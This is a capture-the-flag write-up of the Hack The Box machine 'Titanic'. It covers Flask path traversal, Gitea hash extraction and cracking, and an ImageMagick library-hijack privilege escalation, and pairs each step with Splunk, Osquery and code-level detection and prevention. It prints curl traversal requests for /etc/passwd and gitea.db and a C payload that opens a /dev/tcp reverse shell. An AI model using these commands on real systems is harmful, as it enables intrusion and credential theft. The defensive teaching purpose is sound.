---
title: Titanic
date: 2025-06-21 00:00:00 -0800
categories: [Patch the Box]
tags: [hack the box,linux,web-app,flask,python,osquery,splunk]
description: A simple Flask application that has a Path Traversal vulnerability and later an AppImage software weakness that can be exploited. Detection and prevention opportunities are explored by looking at the web app's source code, using Splunk, and Osquery.
image:
  path: https://i.postimg.cc/nLvLfH0y/titanic-preview.png 
---

### Overview

This is another easy rated Hack The Box Linux machine that starts with looking into a Flask based application. A path traversal opportunity is leveraged to get credentials and local access to the machine. A vulnerable version of ImageMagick is later found which allows for privileged code execution. I look into the Flask application's code for detection and prevention measures. I also use Osquery and Splunk for additional insight into some of the attack methods.

### Attack Tactics

#### Discovery (Path Traversal)

The inital nmap scan only showed two ports open, 22 (SSH) and 80 (Apache), where nmaps's http-title value mentions a redirect to titanic.htb, that's added to `/etc/hosts`. The website is Titanic themed and overall appears sparse with few usable links or interesting content in the source code. There are two "Book" related buttons that allow for passenger details to be submitted:

![image](https://i.postimg.cc/NjWj9yK9/titanic-book.png){: width='483' height='616'}

I looked at the connection in Burp which sent a POST request to `/book` with a 302 response. This redirected to `/download?ticket=3a2ae495-c57f-4f77-a2db-849e885b5cdd.json` which downloads the file/passenger booking data (the json filename was created automatically). The file reference looked like an opportunity to test for path traversal or file inclusion. I first used curl to check that the json data could be retrieved and with that being successful tried `/etc/passwd` which also worked. The interesting account names looked to be `root` and `developer`.

```bash
curl "http://titanic.htb/download?ticket=3801b30e-51f1-4d1d-bf7a-4a3e80906457.json"
curl "http://titanic.htb/download?ticket=../../../etc/passwd"
```

Some more quick checks revealed a subdomain when viewing `/etc/hosts` with the path traversal:

![image](https://i.postimg.cc/YCQJRjXm/titanic-hosts.png){: width='528' height='103'}

> __Detect:__ To provide visibility into the HTTP requests I added logging to the Flask application and configured Splunk to forward those logs:
{: .prompt-tip}

These modifications were added to `app.py` to facilitate the http logs which were then stored in an `access.log` file:

```python
import logging
from flask import Flask, request, g
import os
import time

# Configure logging
logging.basicConfig(
    filename='/var/log/flask/access.log',
    format='%(asctime)s %(levelname)s: %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S'
)

@app.before_request
def before_request():
    g.start_time = time.time()

@app.after_request
def after_request(response):
    duration = time.time() - g.start_time
    app.logger.info(f"{request.remote_addr} {request.method} {request.url} {response.status_code} {duration:.3f}s")
    return response
```

To setup the Splunk configuration I loosely followed the "Steps for Installing/Configuring Linux forwarders"[^1] since I already had a Splunk server installed. Key portions of the configuration were adding an `inputs.conf` file at `/opt/splunkforwarder/etc/system/local/`:

```console
[monitor:///var/log/flask/access.log]
disabled = false
index = main
sourcetype = flask_access
source = flask_app
host = titanic
```

As well as adding an `outputs.conf` file in the same directory because for some reason the `/opt/splunkforwarder/bin/splunk add forward-server` command didn't seem to initiate connections for me.

```console
[tcpout]
defaultGroup = splunk_indexers

[tcpout:splunk_indexers]
server = 10.10.14.224:7999  # I used this port and my HTB VPN address along with socat that then forwards to the Splunk server's 9997
```

After this I restarted Flask and Splunk to detect the path traversal connections:

```bash
systemctl restart flask-app.service
/opt/splunkforwarder/bin/splunk restart
```

![image](https://i.postimg.cc/WzxsF38b/titanic-dir-traversal.png){: width='1118' height='153'}

> __Prevent:__ As a prevention measure I modified the application so the `ticket`'s server-side file path is compared against the resulting file path that can be controlled by the user:
{: .prompt-tip}

First this `is_safe_path` function was added to `app.py` in order to restrict file access to files within a specific directory[^2] i.e., the local absolute file path where the ticket IDs get created:

```python
def is_safe_path(basedir, path, follow_symlinks=True):
    if follow_symlinks:
        basedir = os.path.realpath(basedir)
        matchpath = os.path.realpath(path)
    else:
        basedir = os.path.abspath(basedir)
        matchpath = os.path.abspath(path)
    return basedir == os.path.commonpath((basedir, matchpath))
```

Then the `download_ticket` function was modified to use `is_safe_path` instead of just checking if the path exists (commented out):

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    #if os.path.exists(json_filepath):
    if is_safe_path('/opt/app/' + TICKETS_DIR, json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

After restarting Flask and testing prior successful path traversals, subsequent attempts return the "Ticket not found" response instead while still allowing the "ticket booking" process to function:

![image](https://i.postimg.cc/gjbHsyNC/titanic-traversal-prevention.png){: width='932' height='225'}

#### Credential Access (gitea.db)

After adding the dev subdomain to my hosts file I could view a Gitea instance and explore a couple of repositories posted by the `developer` username. There was a docker-config repo that contained mysql credentials in a `docker-compose.yml` as well as gitea `docker-compose.yml` that actually turned out to be more useful:

![image](https://i.postimg.cc/t4D8w8jX/titanic-gitea-data.png){: width='624' height='398'}

The absolute path to the Gitea database is somewhat convoluted but references to `gitea.db`[^3] can be found along with some testing to download the file with the application's path traversal:

```bash
curl "http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db" --output ./gitea.db
```

Opening the file within Kali I looked for hashes which were found under the `user` table.

![image](https://i.postimg.cc/63RXkzcY/titanic-hashes.png){: width='1306' height='195'}

This was an unusual hash format for me, I was able to follow steps 0xdf took for a different [box](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash) which details steps to crack these hashes.

After getting the correct format for `Hashcat` I tried cracking both hashes. The `administrator` account did not crack in a timely manner but `developer`'s did. One-liner steps to get the hash for just the `developer` account along with the command to crack the hash are below:

```bash
sqlite3 gitea.db "SELECT salt,passwd FROM user WHERE name = 'developer'" | read data; salt=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); passwd=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); echo "sha256:50000:${salt}:${passwd}" > developer.hash

hashcat -a 0 developer.hash /usr/share/wordlists/rockyou.txt
```

Since `developer` was known to be an account on the box the cracked password was tested with SSH which was successful for initial access.

#### Privilege Escalation (CVE-2024-41817)

Upon gaining access to the machine's local file system, enumeration quickly revealed interesting files in the `/opt` directory where an `identify_images.sh` was found. The script processes the web page's images with ImageMagick. This likely occurs on a scheduled interval which is a typical theme with unusual bash scripts. I put a `cat.jpg` in the directory and shortly after saw it's metadata get processed so a cronjob was suspected to be running the bash script every minute.

![image](https://i.postimg.cc/nzM2RcKJ/titanic-identify.png){: width='927' height='581'}

Verifying the version of ImageMagick and searching for exploits uncovers these [CVE](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) details with a proof of concept for exploitation.

By using a reverse shell in the system command I was able to verify exploitation when the cronjob ran `magick` so long as the `libxcb.so.1` file was created in the `/opt/app/static/assets/images` directory since it's exploiting usage of the empty environment variables and defaulting to the current working directory. The exploit was also manually triggered from the `images` directory with `magick /dev/null /dev/null` as shown in the PoC[^4].

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/<MY_IP>/443 0>&1'");
    exit(0);
}
EOF
```

After looking in the `/root` directory I could see a `cleanup.sh` which removes the `libxcb.so.1` file from the `images` path, this ran along with the `identify_images.sh` as a cronjob each minute.

> __Detect:__ I used Osquery to check for `libxcb.so.1` being created in the `/opt/app/static/assets/images/` directory:
{: .prompt-tip}

After installing the Osquery `deb` file I created an `osquery.conf` file at `/etc/osquery/`:

```json
{
  "options": {
    "config_plugin": "filesystem",
    "logger_plugin": "filesystem",
    "log_result_events": true,
    "disable_events": false,
    "enable_file_events": true
  },
  "file_paths": {
    "test_fim": [
      "/opt/app/static/assets/images/**"
    ]
  },
  "schedule": {
    "file_events_test": {
      "query": "SELECT * FROM file_events WHERE target_path LIKE '%libxcb.so.1';",
      "interval": 60,
      "description": "Monitor specific directory for libxcb.so.1 creation"
    }
  }
}
```

The `inputs.conf` file at `/opt/splunkforwarder/etc/system/local/` then had the below lines appended followed by a restart of `osqueryd`:

```console
[monitor:///var/log/osquery/osqueryd.results.log]
sourcetype = osqueryd.results
index = main
source = osquery_fim
host = titanic
```

This provided insight into these specific file creations as a detection starting point, for example if the application for some reason could not be upgraded to a newer version.

![image](https://i.postimg.cc/8P2NH7Sh/titanic-lib-create1.png){: width='775' height='180'}
![image](https://i.postimg.cc/7Lxvs7QT/titanic-lib-create2.png){: width='725' height='563'}

### Further Reading
- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [0xdf - Compiled: Crack Gitea Hash](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash)
- [ImageMagick - Arbitrary Code Execution](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
- [Splunk - Install on Linux](https://help.splunk.com/en/splunk-enterprise/get-started/install-and-upgrade/9.3/install-splunk-enterprise-on-linux-or-macos/install-on-linux)
- [Osquery Documentation](https://osquery.readthedocs.io/en/latest/introduction/using-osqueryi/)

#### Footnotes
[^1]: [https://community.splunk.com/t5/All-Apps-and-Add-ons/How-do-I-configure-a-Splunk-Forwarder-on-Linux/m-p/72078](https://community.splunk.com/t5/All-Apps-and-Add-ons/How-do-I-configure-a-Splunk-Forwarder-on-Linux/m-p/72078)
[^2]: [https://security.openstack.org/guidelines/dg_using-file-paths.html](https://security.openstack.org/guidelines/dg_using-file-paths.html)
[^3]: [https://docs.gitea.com/administration/config-cheat-sheet#database-database](https://docs.gitea.com/administration/config-cheat-sheet#database-database)
[^4]: [https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
